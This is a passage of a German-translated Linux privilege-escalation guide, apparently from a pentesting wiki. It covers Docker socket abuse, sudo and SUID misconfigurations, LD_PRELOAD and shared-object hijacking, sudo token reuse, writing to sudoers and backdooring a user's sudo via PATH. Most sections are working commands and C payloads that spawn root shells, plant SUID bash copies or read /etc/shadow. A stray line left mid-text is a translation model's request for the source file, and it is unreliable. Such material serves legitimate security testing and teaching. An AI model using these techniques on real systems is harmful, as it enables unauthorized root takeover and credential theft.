Diese Befehle ermöglichen es, einen Container mit Root-Zugriff auf das Dateisystem des Hosts auszuführen.

#### **Direkte Verwendung der Docker API**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **List Docker Images:** Liste der verfügbaren Images abrufen.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Sende eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Verwende `socat`, um eine Verbindung zum Container herzustellen und so die Ausführung von Befehlen darin zu ermöglichen.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nach dem Einrichten der `socat`-Verbindung kannst du Befehle direkt im Container ausführen, mit Root-Zugriff auf das Dateisystem des Hosts.

### Sonstiges

Beachte, dass wenn du Schreibrechte auf den docker socket hast, weil du **inside the group `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) hast. Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) ebenfalls auf einem Port lauscht, kannst du sie möglicherweise kompromittieren.

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes **inter-Process Communication (IPC) system**, das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Für moderne Linux-Systeme konzipiert bietet es ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Zudem hilft es beim Broadcasten von Ereignissen oder Signalen und fördert so die nahtlose Integration von Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten, was die Benutzererfahrung verbessert. Zusätzlich unterstützt D-Bus ein remote object system, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse erleichtert, die traditionell komplex waren.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf dem kumulativen Effekt übereinstimmender Policy-Regeln. Diese Policies legen die Interaktionen mit dem Bus fest und können durch Ausnutzen dieser Berechtigungen potenziell zu privilege escalation führen.

Ein Beispiel einer solchen Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen dafür, dass der root-Benutzer `fi.w1.wpa_supplicant1` besitzen, Nachrichten an ihn senden und von ihm empfangen darf.

Policies ohne angegebenen Benutzer oder Gruppe gelten universell, während "default" Context-Policies für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine herauszufinden.

### Generische enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Prüfe immer Netzwerkdienste, die auf dem Rechner laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Aufzählung

Überprüfe, wer du bist, welche **Privilegien** du hast, welche **Benutzer** im System sind, welche sich einloggen können und welche **root-Rechte** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root privileges gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwort-Richtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, **versuche, dich mit diesem Passwort als jeden Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen, und die Binärdateien `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer zu brute-forcen.

## Missbrauch beschreibbarer $PATHs

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben** kannst, könntest du möglicherweise Privilegien eskalieren, indem du **eine backdoor in dem beschreibbaren Ordner erstellst**, die den Namen eines Befehls trägt, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und **nicht aus einem Verzeichnis geladen wird, das vor deinem beschreibbaren Ordner im $PATH liegt**.

### SUDO and SUID

Du könntest berechtigt sein, einen Befehl mit sudo auszuführen, oder sie könnten das suid-Bit gesetzt haben. Prüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine Shell zu erhalten, indem man einen ssh-Schlüssel in das root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt es dem Benutzer, während der Ausführung **eine Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **based on HTB machine Admirer**, war **vulnerable** für **PYTHONPATH hijacking**, um eine beliebige python library zu laden, während das script als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV beibehalten über sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Warum das funktioniert: Bei nicht-interaktiven Shells wertet Bash `$BASH_ENV` aus und lädt diese Datei, bevor es das Zielskript ausführt. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten geladen.

- Anforderungen:
- Eine sudo-Regel, die du ausführen kannst (jeder Zielbefehl, der `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` muss in `env_keep` vorhanden sein (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, verwende `env_reset`.
- Vermeide Shell-Wrapper für über sudo erlaubte Befehle; verwende minimale Binaries.
- Erwäge sudo I/O-Logging und Benachrichtigung/Alerting, wenn erhaltene Umgebungsvariablen verwendet werden.

### Terraform via sudo mit erhaltenem HOME (!env_reset)

Wenn sudo die Umgebung intakt lässt (`!env_reset`) und `terraform apply` erlaubt, bleibt `$HOME` des aufrufenden Benutzers. Terraform lädt daher **$HOME/.terraformrc** als root und beachtet `provider_installation.dev_overrides`.

- Setze den benötigten Provider auf ein schreibbares Verzeichnis und lege ein bösartiges Plugin mit dem Namen des Providers ab (z. B. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform schlägt beim Go plugin handshake fehl, führt jedoch den Payload als root aus, bevor es abstirbt und dabei eine SUID shell zurücklässt.

### TF_VAR overrides + symlink validation bypass

Terraform-Variablen können über Umgebungsvariablen `TF_VAR_<name>` bereitgestellt werden, die erhalten bleiben, wenn sudo die Umgebung bewahrt. Schwache Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` können mit symlinks umgangen werden:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform löst den Symlink auf und kopiert die echte `/root/root.txt` in ein attacker-readable Ziel. Derselbe Ansatz kann verwendet werden, um **in privilegierte Pfade zu schreiben**, indem Ziel-Symlinks vorab erstellt werden (z. B. indem der Zielpfad des Providers innerhalb von `/etc/cron.d/` zeigt).

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` anzeigt oder ein `secure_path` attacker-writable entries enthält (z. B. `/home/<user>/bin`), kann jeder relative Befehl innerhalb des vom sudo erlaubten Ziels überschattet werden.

- Voraussetzungen: eine sudo-Regel (oft `NOPASSWD`), die ein Skript/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps`, etc.) und ein beschreibbarer PATH-Eintrag, der zuerst durchsucht wird.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo-Ausführung: Pfade umgehen
**Springe** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn eine **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne angegebenen Pfad

Wenn die **sudo-Berechtigung** einem einzelnen Befehl **ohne Angabe des Pfads** gewährt wird: _hacker10 ALL= (root) less_ kannst du sie ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines merkwürdigen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, dann kannst du versuchen, **eine Funktion zu exportieren**, die den Namen des Befehls trägt, den die suid file aufruft.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du das suid-Binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird — insbesondere bei **suid/sgid**-Executables — erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Eine Privilegieneskalation kann auftreten, wenn du Befehle mit `sudo` ausführen darfst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt, dass die Umgebungsvariable **LD_PRELOAD** auch bei der Ausführung von Befehlen mit `sudo` erhalten bleibt und erkannt wird, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich, **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Eine ähnliche privesc kann ausgenutzt werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er dadurch den Pfad bestimmt, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn Sie auf ein Binary mit **SUID**-Berechtigungen stoßen, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Dies lässt sich überprüfen, indem Sie den folgenden Befehl ausführen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches exploitation hin.

Um dies zu exploit, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht, nach Kompilierung und Ausführung, elevate privileges zu erlangen, indem er Dateiberechtigungen manipuliert und eine shell mit elevated privileges startet.

Kompiliere die obenstehende C-Datei in eine shared object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID binary den exploit auslösen und so eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die library in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Bitte sende den vollständigen Inhalt der Datei src/linux-hardening/privilege-escalation/README.md (oder den zu übersetzenden Text), damit ich ihn vollständig und korrekt ins Deutsche übersetzen kann.
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die Bibliothek, die du erzeugt hast, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du in einem Befehl **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du Zugriff auf `sudo -l` hast, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es einen Weg findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und dann das Session-Token kaperst**.

Voraussetzungen, um Privilegien zu eskalieren:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten** **`sudo` verwendet**, um etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die uns erlaubt, `sudo` zu verwenden, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst temporär ptrace_scope mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt das Binary `activate_sudo_token` in _/tmp_. Du kannst es verwenden, um das **sudo-Token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh shell in _/tmp_, die **im Besitz von root mit setuid** ist.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird **eine sudoers-Datei erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie im Ordner oder für eine der darin erstellten Dateien **write permissions** besitzen, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **create a sudo token for a user and PID**.\
Zum Beispiel, wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine shell als dieser Benutzer mit PID 1234 haben, können Sie **obtain sudo privileges** erlangen, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom user root und der group root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du irgendeine Datei **schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie schreiben können, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binary, wie z. B. `doas` für OpenBSD. Überprüfe dessen Konfiguration in `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **user sich normalerweise an einer Maschine anmeldet und `sudo`** verwendet, um Privilegien zu eskalieren, und du eine Shell im Kontext dieses Users bekommen hast, kannst du **eine neue sudo-executable erstellen**, die deinen Code als root und anschließend den Befehl des Users ausführt. Dann **ändere den $PATH** des Benutzerkontexts (zum Beispiel durch Hinzufügen des neuen Pfads in .bash_profile), sodass beim Ausführen von sudo deine sudo-executable ausgeführt wird.

Beachte, dass du, falls der User eine andere Shell (nicht bash) benutzt, andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Eintrag: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **weisen auf andere Verzeichnisse hin**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` sucht**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder ein Verzeichnis, das in einer der Konfigurationsdateien unter `/etc/ld.so.conf.d/*.conf` angegeben ist, könnte er Privilegien eskalieren.  
Sieh dir an, **wie diese Fehlkonfiguration ausgenutzt werden kann**, auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn man die lib nach `/var/tmp/flag15/` kopiert, wird sie an dieser Stelle vom Programm verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einem Prozess eine **Teilmenge der verfügbaren Root-Privilegien** zur Verfügung. Dadurch werden Root-**Privilegien effektiv in kleinere und unterscheidbare Einheiten aufgeteilt**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. Auf diese Weise wird der gesamte Satz an Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über capabilities und wie man sie missbrauchen kann** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer in das Verzeichnis "**cd**" kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien löschen** und **neu erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und sind in der Lage, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über Datei- oder Verzeichniszugriffe, indem sie bestimmten Benutzern, die weder Besitzer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese Ebene der **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden sich [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Hole** Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

